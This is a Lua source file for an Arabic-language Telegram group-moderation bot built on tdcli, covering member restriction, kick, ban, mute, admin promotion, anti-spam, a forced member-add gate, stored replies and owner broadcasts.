function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil) end
function setphoto(chat_id, photo) tdcli_function ({    ID = "ChangeChatPhoto",   chat_id_ = chat_id,  photo_ = getInputFile(photo) }, dl_cb, nil) end
function getChatId(id) local chat = {} local id = tostring(id) if id:match('^-100') then local channel_id = id:gsub('-100', '') chat = {ID = channel_id, type = 'channel'} else local group_id = id:gsub('-', '') chat = {ID = group_id, type = 'group'} end return chat end
local getUser = function(user_id, cb)  tdcli_function({ID = "GetUser", user_id_ = user_id}, cb, nil) end
function adduser(chat_id, user_id, forward_limit) tdcli_function ({ ID = "AddChatMember", chat_id_ = chat_id, user_id_ = user_id, forward_limit_ = forward_limit or 50 }, dl_cb, nil) end
function ked(msg,chat,user)  if tonumber(user) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*❌¦* لا تستطيع تقيد البوت', 1, 'md')  return false  end  if storm1(chat,user) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*❌¦* لا تستطيع تقيد {الادمنيه او المدراء او المميزين}', 1, 'md')  else  HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..chat.. "&user_id=" ..user.."") tahadevstorm:sadd(DEVSTOR.."keed", chat) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تـم تقييـده بنجـاح' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end  tahadevstorm:sadd(DEVSTOR..'tedmembars'..chat,user) end 
function unked(msg,chat,user)  if tonumber(user) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*❌¦* لا تستطيع تقيد البوت', 1, 'md')  return false  end  if storm1(chat,user) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*❌¦* لا تستطيع تقيد {الادمنيه او المدراء او المميزين}', 1, 'md')  else  HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..chat.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") tahadevstorm:srem(DEVSTOR.."keed", chat) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم الغاء تقييده '  stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end tahadevstorm:srem(DEVSTOR..'tedmembars'..chat,user) end 
function banall(msg,chat,user) if tonumber(user) == tonumber(bot_id) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦*  لا تستطيع حضر او طرد او كتم البوت 🎎', 1, 'md') return false end if storm1(chat,user) then storm_sendMsg(msg.chat_id_, msg.id_, 1,'*◗🚨¦ عذرآ لا تستطيع حظر وكتم وطرد وتقيد ال(مدراء او الادمنيه او المميزين) 💢*', 1, 'md') else if is_devtaha(msg) then t = 'مطور اساسي' elseif is_sudo(msg) then t = 'مطور' elseif is_owner(msg) then t = 'مدير الكروب' elseif is_mod(msg) then t = 'ادمن الكروب' end changeChatMemberStatus(chat, user, "Kicked") tahadevstorm:sadd(DEVSTOR..'storm:gbaned',user) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم حظره عام' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user))   end end
function kick(msg,chat,user) if tonumber(user) == tonumber(bot_id) then return false end if storm1(chat,user) then else changeChatMemberStatus(chat, user, "Kicked") end end
function kickm(msg,chat,user) if tonumber(user) == tonumber(bot_id) then return false end if storm1(chat,user) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '☇*¦* لا تسطيع حضر او كتم او طرد ( الادمنيه و المدراء )', 1, 'md') else if is_devtaha(msg) then t = 'مطور اساسي' elseif is_sudo(msg) then t = 'مطور' elseif is_owner(msg) then t = 'مدير الكروب' elseif is_mod(msg) then t = 'ادمن الكروب' end changeChatMemberStatus(chat, user, "Kicked") 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم طرده بنجاح' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user))  end end
function ban(msg,chat,user) if tonumber(user) == tonumber(bot_id) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦*  لا تستطيع حضر او طرد او كتم البوت ', 1, 'md') return false end if storm1(chat,user) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع حظر وكتم وطرد وتقيد ال(مدراء او الادمنيه او المميزين) 💢*', 1, 'md') else if is_devtaha(msg) then t = 'مطور اساسي' elseif is_sudo(msg) then t = 'مطور' elseif is_owner(msg) then t = 'مدير الكروب' elseif is_mod(msg) then t = 'ادمن الكروب' end changeChatMemberStatus(chat, user, "Kicked") tahadevstorm:sadd(DEVSTOR..'storm:baned'..chat,user) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم حظره بنجاح ' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end end
function mute(msg,chat,user) if tonumber(user) == tonumber(bot_id) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦*  لا تستطيع حضر او طرد او كتم البوت 🎎', 1, 'md') return false end if storm1(chat,user) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع حظر وكتم وطرد وتقيد ال(مدراء او الادمنيه او المميزين) 💢*', 1, 'md') else if is_devtaha(msg) then t = 'مطور اساسي' elseif is_sudo(msg) then t = 'مطور' elseif is_owner(msg) then t = 'مدير الكروب' elseif is_mod(msg) then t = 'ادمن الكروب' end tahadevstorm:sadd(DEVSTOR..'mutes'..chat,user) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم كتمه بنجاح' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user))  end end
function unbanall(msg,chat,user) if tonumber(user) == tonumber(bot_id) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦*  لا تستطيع حضر او طرد او كتم البوت 🎎', 1, 'md') return false end if is_devtaha(msg) then t = 'مطور اساسي' elseif is_sudo(msg) then t = 'مطور' elseif is_owner(msg) then t = 'مدير الكروب' elseif is_mod(msg) then t = 'ادمن الكروب' end tahadevstorm:srem(DEVSTOR..'storm:gbaned',user) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم الغاء حظره عام بنجاح' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user))   end
function unban(msg,chat,user)  if tonumber(user) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦*  لا تستطيع حضر او طرد او كتم البوت 🎎', 1, 'md') return false  end  if is_devtaha(msg) then t = 'مطور اساسي' elseif is_sudo(msg) then t = 'مطور' elseif is_owner(msg) then t = 'مدير الكروب' elseif is_mod(msg) then t = 'ادمن الكروب' end  tahadevstorm:srem(DEVSTOR..'storm:baned'..chat,user)   changeChatMemberStatus(chat, user, "Left")  getChannelMembers(chat, 0, 'Kicked', 2000, unban, {chat_id_ = chat, msg_id_ = msg.id_}) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم الغاء حظره بنجاح' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end
function unmute(msg,chat,user) if tonumber(user) == tonumber(bot_id) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*🚨¦*  لا تستطيع حضر او طرد او كتم البوت 🎎', 1, 'md') return false end if is_devtaha(msg) then t = 'مطور اساسي' elseif is_sudo(msg) then t = 'مطور' elseif is_owner(msg) then t = 'مدير الكروب' elseif is_mod(msg) then t = 'ادمن الكروب' end tahadevstorm:srem(DEVSTOR..'mutes'..chat,user) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم الغاء كتمه بنجاح' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end
function delete_msg(chatid,mid) tdcli_function ({ID="DeleteMessages", chat_id_=chatid, message_ids_=mid}, dl_cb, nil) end
function user(msg,chat,text,user) entities = {} if text and text:match('<user>') and text:match('<user>') then local x = string.len(text:match('(.*)<user>')) local offset = x local y = string.len(text:match('<user>(.*)</user>')) local length = y text = text:gsub('<user>','') text = text:gsub('</user>','') table.insert(entities,{ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user}) end entities[0] = {ID='MessageEntityBold', offset_=0, length_=0} return tdcli_function ({ID="SendMessage", chat_id_=chat, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_=entities}}, dl_cb, nil) end
function monsh(msg,chat,user) tahadevstorm:sadd(DEVSTOR..'moder'..chat,user) tahadevstorm:srem(DEVSTOR..'storm:baned'..chat,user) tahadevstorm:srem(DEVSTOR..'mutes'..chat,user) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم ترقيته منشئ المجموعه' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end 
function demmonsh(msg,chat,user)   tahadevstorm:srem(DEVSTOR..'moder'..chat,user) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم تنزيله من المنشئين' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end 
function moder(msg,chat,user) tahadevstorm:sadd(DEVSTOR..'modergroup'..chat,user)   tahadevstorm:srem(DEVSTOR..'storm:baned'..chat,user) tahadevstorm:srem(DEVSTOR..'mutes'..chat,user) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم ترقيته مدير'  stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end 
function demmoder(msg,chat,user)  tahadevstorm:srem(DEVSTOR..'modergroup'..chat,user) tahadevstorm:srem(DEVSTOR..'storm:baned'..chat,user) tahadevstorm:srem(DEVSTOR..'mutes'..chat,user) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم تنزيله من الاداره' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end 
function mods(msg,chat,user) tahadevstorm:sadd(DEVSTOR..'mods:'..chat,user)   tahadevstorm:srem(DEVSTOR..'storm:baned'..chat,user) tahadevstorm:srem(DEVSTOR..'mutes'..chat,user) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم ترقيته ادمن في البوت'  stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end 
function demmods(msg,chat,user)  tahadevstorm:srem(DEVSTOR..'mods:'..chat,user) tahadevstorm:srem(DEVSTOR..'storm:baned'..chat,user) tahadevstorm:srem(DEVSTOR..'mutes'..chat,user) 
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم تنزيله من الادمنيه' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end 
function vipgroups(msg,chat,user)  tahadevstorm:sadd(DEVSTOR..'vip:group'..chat,user) tahadevstorm:srem(DEVSTOR..'storm:baned'..chat,user) tahadevstorm:srem(DEVSTOR..'mutes'..chat,user)  
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم ترقيته مميز في البوت' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end 
function demvipgroups(msg,chat,user)  tahadevstorm:srem(DEVSTOR..'vip:group'..chat,user)
local taha = '📛¦ العضو ◗'..user..'◖\n📬¦ تم تنزيله من مميزين البوت'  stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end 
function trigger_anti_spam(msg,type)
if type == 'kick' then kick(msg,msg.chat_id_,msg.sender_user_id_) stormmonshn(msg.chat_id_, msg.sender_user_id_, msg.id_, '💥¦ العضو • ( '..msg.sender_user_id_..' ) قام بعمل تكرار في المجموعه وتم طرده' , 13, string.len(msg.sender_user_id_)) end if type == 'ban' then
if is_banned(msg.chat_id_,msg.sender_user_id_) then else stormmonshn(msg.chat_id_, msg.sender_user_id_, msg.id_, '💥¦ العضو • ( '..msg.sender_user_id_..' ) قام بعمل تكرار في المجموعه وتم حظره' , 13, string.len(msg.sender_user_id_)) end changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked") tahadevstorm:sadd(DEVSTOR..'storm:baned'..msg.chat_id_,msg.sender_user_id_) end if type == 'mute' then
if is_muted(msg.chat_id_,msg.sender_user_id_) then else stormmonshn(msg.chat_id_, msg.sender_user_id_, msg.id_, '💥¦* العضو • ( '..msg.sender_user_id_..' ) قام بعمل تكرار في المجموعه وتم كتمه' , 13, string.len(msg.sender_user_id_)) end tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_) end end function televardump(msg,value) local text = json:encode(value) storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 'html') end
function chackgp(msg)  local hash = tahadevstorm:sismember(DEVSTOR..'bot:gps', msg.chat_id_)
if hash then return true else return false end end
function STORM(msg,data) if msg then 
tahadevstorm:incr(DEVSTOR..'groupmsg:'..msg.chat_id_..':') 
tahadevstorm:incr(DEVSTOR..'user:messages:'..msg.chat_id_..':'..msg.sender_user_id_) 
tahadevstorm:incr(DEVSTOR..'msg:chat:'..msg.chat_id_..':') 
tahadevstorm:incr(DEVSTOR..'msg:user:'..msg.chat_id_..':'..msg.sender_user_id_)
if msg.send_state_.ID == "MessageIsSuccessfullySent" then return false  end end
if msg.can_be_deleted_ == true and not is_mod(msg) then  if tahadevstorm:get(DEVSTOR..'add:mepr:'..msg.chat_id_) and tonumber(tahadevstorm:scard(DEVSTOR..'addedtaha:'..msg.sender_user_id_)) == tonumber(tahadevstorm:get(DEVSTOR..'setadd:'..msg.chat_id_)) then  tahadevstorm:sadd(DEVSTOR..'meaddwy:'..msg.chat_id_,msg.sender_user_id_)  tahadevstorm:del(DEVSTOR.."addedtaha:"..msg.sender_user_id_)  tahadevstorm:srem(DEVSTOR..'meaddtaha:'..msg.chat_id_,msg.sender_user_id_)  storm_sendMsg(msg.chat_id_,msg.id_,1,'🚸 • العضو *{* ['..get_username(msg.sender_user_id_)..'] *}* \n☑ • لقد قمت باضافه *{'..tonumber(tahadevstorm:get(DEVSTOR..'setadd:'..msg.chat_id_))..'}* اعضاء \n📇 • الان تستطيع التكلم \n',1,'md')  elseif msg.content_.text_ and tahadevstorm:get(DEVSTOR..'add:mepr:'..msg.chat_id_) and not tahadevstorm:sismember(DEVSTOR..'meaddwy:'..msg.chat_id_,msg.sender_user_id_) and not tahadevstorm:sismember(DEVSTOR..'meaddtaha:'..msg.chat_id_,msg.sender_user_id_) then  if tonumber(tahadevstorm:scard(DEVSTOR..'addedtaha:'..msg.sender_user_id_)) ~= tonumber(tahadevstorm:get(DEVSTOR..'setadd:'..msg.chat_id_)) then  function check_can_send(extra,result,success)  tahadevstorm:sadd(DEVSTOR..'meaddtaha:'..msg.chat_id_,msg.sender_user_id_)  local mustadd = (tahadevstorm:get(DEVSTOR..'setadd:'..msg.chat_id_) or '0')  username = '@'..(result.username_ or 'ماكو معرف ❌')..''  taha = '\n🚸❯ العضو • *{* ['..username..'] *}*\n📮❯ لا تستطيع التحدث هنا \n📬❯ قم باضافه عدد من الاعضاء\n📥❯ عدد الاعضاء المطلوله *{ '..(mustadd)..' }*'  storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  end  getUser(msg.sender_user_id_,check_can_send)  end  end  if msg.content_.ID == "MessageChatAddMembers" then  local mem_id = msg.content_.members_  for i=0,#mem_id do  if tahadevstorm:get(DEVSTOR..'add:mepr:'..msg.chat_id_) then  if not tahadevstorm:sismember(DEVSTOR..'meaddwy:'..msg.chat_id_,msg.sender_user_id_) then  if mem_id[i].username_ and mem_id[i].username_:match("[Bb][Oo][Tt]$") then  return false  else  tahadevstorm:sadd(DEVSTOR..'addedtaha:'..msg.sender_user_id_,mem_id[i].id_)  end  end  end  end  end  if tahadevstorm:get(DEVSTOR..'add:mepr:'..msg.chat_id_) and not tahadevstorm:sismember(DEVSTOR..'meaddwy:'..msg.chat_id_,msg.sender_user_id_) then  if msg.content_.ID == "MessageChatJoinByLink" then  return false  else  deleteMessages(msg.chat_id_,{[0] = msg.id_})   end end end
if msg.content_.photo_ then  if tahadevstorm:get(DEVSTOR..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then if msg.content_.photo_.sizes_[3] then  photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ else photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ end storm_sendMsg(msg.chat_id_, msg.id_, 1, '🎑*¦* تم تغيير صوره المجموعه \n', 1, 'md') tahadevstorm:del(DEVSTOR..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_) stormset(msg.chat_id_, photo_id) end   end
if msg.chat_id_ then local id = tostring(msg.chat_id_) if id:match('-100(%d+)') then chat_type = 'super'
elseif id:match('^(%d+)') then chat_type = 'user' else chat_type = 'group' end end
function savegp(extra, result, success) name = (result.title_ or false)    hash = 'sgp:'..msg.chat_id_   tahadevstorm:hset(hash, 'name', name) end  
function saveuser(extra, result, success)  if result.username_ then  uname = '@'..(result.username_ ) else uname = result.id_  end  name = (result.first_name_ or false) hash = 'users:'..result.id_   tahadevstorm:hset(hash, 'name', name)   tahadevstorm:hset(hash, 'uname', uname)     end local text = msg.content_.text_
if text and text:match('[qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM]') then text = text end
if msg.content_.ID == "MessageText" then msg_type = 'text' end
if msg.content_.ID == "MessageChatAddMembers" then msg_type = 'add' end
if msg.content_.ID == "MessageChatJoinByLink" then msg_type = 'join' end
if msg.content_.ID == "MessagePhoto" then msg_type = 'photo' end
if tahadevstorm:get(DEVSTOR..'viewchannel'..msg.sender_user_id_) then if not msg.forward_info_ then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*📛¦* هاذا ليس توجيه من القناة', 1, 'md') tahadevstorm:del(DEVSTOR..'viewchannel'..msg.sender_user_id_) else storm_sendMsg(msg.chat_id_, msg.id_, 1, '💥*¦*  عدد المشاهدات المنشور ( '..msg.views_..' ) مشاهده ♨', 1, 'md') tahadevstorm:del(DEVSTOR..'viewchannel'..msg.sender_user_id_) end end
if msg.content_.ID == 'MessageText' and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lock:text'..msg.chat_id_) then      if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الرسائل  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end   end   end  
if text then   if is_filter(msg,text) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الكلمات الممنوعه  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})          end     end  end
if text then if not tahadevstorm:get(DEVSTOR..'bot_id') then
function cb(a,b,c) tahadevstorm:set(DEVSTOR..'bot_id',b.id_) end getMe(cb) end end
if text then local test = tahadevstorm:get(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id)    if test and test == 'yes11' then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ تم حذف الرد بنجاح* \n", 1, 'md')    tahadevstorm:del(DEVSTOR.."add:repallt"..msg.sender_user_id_..bot_id)    tahadevstorm:del(DEVSTOR.."add:repallt:gif:all"..text..bot_id)    tahadevstorm:del(DEVSTOR.."add:rep:tvico:all"..text..bot_id)    tahadevstorm:del(DEVSTOR.."add:rep:tstekr:all"..text..bot_id)    tahadevstorm:del(DEVSTOR.."add:rep:text:all"..text..bot_id)    tahadevstorm:srem("rep:media:all"..bot_id,text)    return false    end    end    
if text then local test = tahadevstorm:get(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    if test and test == 'yes11' then     storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ تم حذف الرد بنجاح* \n", 1, 'md')    tahadevstorm:del(DEVSTOR.."add:repallt:rd"..msg.sender_user_id_..bot_id)    tahadevstorm:del(DEVSTOR.."add:repallt:gif:all:rd"..text..bot_id)    tahadevstorm:del(DEVSTOR.."add:rep:tvico:all:rd"..text..bot_id)    tahadevstorm:del(DEVSTOR.."add:rep:tstekr:all:rd"..text..bot_id)    tahadevstorm:del(DEVSTOR.."add:rep:text:all:rd"..text..bot_id)    tahadevstorm:srem("rep:media:all:rd"..bot_id,text)    return false    end    end
if text then local test = tahadevstorm:get(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  if test and test == 'reppp' then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* تم حذف الرد بنجاح \n", 1, 'md')  tahadevstorm:del(DEVSTOR.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."add:reply1:gif"..text..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."add:reply1:vico"..text..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."add:reply1:stekr"..text..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."add:reply:rd"..text..msg.chat_id_)  tahadevstorm:srem("repmedia"..msg.chat_id_,text)  return false  end  end
if text then local test = tahadevstorm:get(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  if test and test == 'reppp' then   storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* تم حذف الرد بنجاح \n", 1, 'md')  tahadevstorm:del(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."addreply1:gif"..text..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."addreply1:vico"..text..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."addreply1:stekr"..text..msg.chat_id_)  tahadevstorm:del(DEVSTOR.."taha:"..text..msg.chat_id_)  tahadevstorm:srem("rep:media"..msg.chat_id_,text)  return false  end  end
if text then if tahadevstorm:get(DEVSTOR..'namebot:witting'..msg.sender_user_id_) then tahadevstorm:del(DEVSTOR..'namebot:witting'..msg.sender_user_id_) tahadevstorm:set(DEVSTOR..'storm:name',text) storm_sendMsg(msg.chat_id_, msg.id_, 1, "*♻¦* تم تغير اسم البوت \n",1, 'md')  end end
if tahadevstorm:get(DEVSTOR.."welc:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then tahadevstorm:del(DEVSTOR.."welc:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  local welcome = text:match("(.*)")  tahadevstorm:set(DEVSTOR..'welcome:'..msg.chat_id_,welcome) storm_sendMsg(msg.chat_id_, msg.id_, 1,'\n📬*¦*تم وضع الترحيب \n', 1, 'md')    end
if tahadevstorm:get(DEVSTOR.."numadd:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then tahadevstorm:del(DEVSTOR.."numadd:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  local numadded = string.match(text, "(%d+)") tahadevstorm:set(DEVSTOR..'setadd:bot'..bot_id,numadded)  storm_sendMsg(msg.chat_id_, msg.id_,  1, "📬*¦* تم وضع عدد الاضافه *{ "..numadded..' }*', 1, 'md')  end
if tahadevstorm:get(DEVSTOR.."set:description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  tahadevstorm:del(DEVSTOR.."set:description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   local Description = text:match("(.*)") setChatDescription(msg.chat_id_, Description) storm_sendMsg(msg.chat_id_, msg.id_, 1,'\n📬*¦* تم وضع وصف للمجموعه \n', 1, 'md')   end 
if tahadevstorm:get(DEVSTOR.."photo:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then tahadevstorm:del(DEVSTOR.."photo:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  local pro = tonumber(text:match("(%d+)")) local function myprofile(extra, result, success) if result.total_count_ == 0 then storm_sendMsg(msg.chat_id_, msg.id_,  1, '*🚨¦* عذرا انت لا تمتلك صور في البروفايل\n', 1, 'md') else if result.total_count_ >= pro then if result.photos_[0] then sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_, '\n🌁¦ صورتك رقم ◗ '..pro..' ◖\n📋¦ عدد صورك ◗ '..result.total_count_..' ◖\n📊¦ حجم صورتك ◗ '..result.photos_[0].sizes_[1].photo_.size_..' ◖') end else storm_sendMsg(msg.chat_id_, msg.id_,  1, '\n*📛¦* انت لا تمتلك صوره رقم  *{'..pro..'}*\n*🌁¦* عدد صورك هي *{'..result.total_count_..'}*', 1, 'md')  end end end getUserProfilePhotos(msg.sender_user_id_, pro-1, 1000, myprofile)  end
if tahadevstorm:get(DEVSTOR.."link:group"..msg.chat_id_) == 'setlinkwai' and is_mod(msg) then if text and text:match("^الغاء$") then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* تم الغاء الامر ♨", 1, "md") tahadevstorm:del(DEVSTOR.."link:group" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) else  if text:match("(https://telegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)") then     local glink = text:match("(https://telegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)")   local hash = "link:group"..msg.chat_id_   tahadevstorm:set(DEVSTOR..hash,glink)   storm_sendMsg(msg.chat_id_, msg.id_, 1, '💥*¦* تم حفظ الرابط الخاص بالمجموعه', 1, 'md')  end   end end
if tahadevstorm:get(DEVSTOR.."bc:in:grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then if text and text:match("^الغاء$") then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* تم الغاء الامر ♨", 1, "md") tahadevstorm:del(DEVSTOR.."bc:in:grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) else local gps = tahadevstorm:scard(DEVSTOR.."botgps") or 0 local gpss = tahadevstorm:smembers(DEVSTOR.."botgps") or 0 local msgs = { [0] = id } for i = 1, #gpss do storm_sendMsg(gpss[i], 0, 1, text, 1, "html") end storm_sendMsg(msg.chat_id_, msg.id_, 1, "💥*¦*  تمت الاذاعه بنجاح ✔ \n ♻*¦* الى ( *" .. gps .. "* ) مجموعات في البوت", 1, "md")     tahadevstorm:del(DEVSTOR.."bc:in:grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) end end
if tahadevstorm:get(DEVSTOR.."bc:in:all" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then  if text and text:match("^الغاء$") then  storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* تم الغاء الامر ♨", 1, "md")  tahadevstorm:del(DEVSTOR.."bc:in:all" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)  else  local gps = tahadevstorm:scard(DEVSTOR.."botgps") or 0  local gpss = tahadevstorm:smembers(DEVSTOR.."botgps") or 0  local msgs = { [0] = id }  for i = 1, #gpss do   storm_sendMsg(gpss[i], 0, 1, text, 1, "html")  end local gpsv = tahadevstorm:scard(DEVSTOR.."usersbot") or 0 local gpssv = tahadevstorm:smembers(DEVSTOR.."usersbot") or 0 local msgs = { [0] = id }  for o = 1, #gpssv do rempv(gpssv[o])  storm_sendMsg(gpssv[o], 0, 1, text, 1, "md")  end  storm_sendMsg(msg.chat_id_, msg.id_, 1, "💥*¦*  تمت الاذاعه بنجاح ✔ \n♻*¦* الى ( *" .. gps .. "* ) مجموعه \n💥*¦* والى ( *"..gpsv..'* ) مشتركين في البوت', 1, "md")      tahadevstorm:del(DEVSTOR.."bc:in:all" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)  end end
if tahadevstorm:get(DEVSTOR.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then if text and text:match("^الغاء$") then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* تم الغاء الامر ♨", 1, "md") tahadevstorm:del(DEVSTOR.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) else local gps = tahadevstorm:scard(DEVSTOR.."usersbot") or 0 local gpss = tahadevstorm:smembers(DEVSTOR.."usersbot") or 0 local msgs = { [0] = id } for i = 1, #gpss do  rempv(gpss[i])  storm_sendMsg(gpss[i], 0, 1, text, 1, "html") end storm_sendMsg(msg.chat_id_, msg.id_, 1, "💥*¦*  تمت الاذاعه بنجاح ✔ \n ♻*¦* الى ( *" .. gps .. "* ) مشتركين في البوت ", 1, "md")     tahadevstorm:del(DEVSTOR.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) end end
if tahadevstorm:get(DEVSTOR.."rules" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then local rules = msg.content_.text_ tahadevstorm:set(DEVSTOR.."rules:group" .. msg.chat_id_, rules) storm_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦*تم حفظ القوانين ✔",  1, "md") end  tahadevstorm:del(DEVSTOR.."rules" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
